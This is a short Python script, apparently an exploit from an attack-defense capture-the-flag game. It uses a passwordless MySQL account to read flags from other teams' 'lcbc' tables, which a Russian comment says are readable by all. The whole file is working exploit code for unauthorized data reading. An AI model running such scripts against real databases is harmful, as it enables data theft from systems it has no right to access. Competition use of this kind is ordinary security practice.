#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Таблицы lcbc в БД каждой команды доступны на чтение всем
import pymysql.cursors
import sys

DB = "kappabonus.spbctf.com"

cnx = pymysql.connect(user='kappa', host=DB,
                        database='team{i}'.format(i=sys.argv[1].split('.')[2]))
cursor = cnx.cursor()
query = "SELECT flag FROM lcbc"
cursor.execute(query)

for row in cursor:
    print(row[0], flush=True)

cursor.close()
cnx.close()
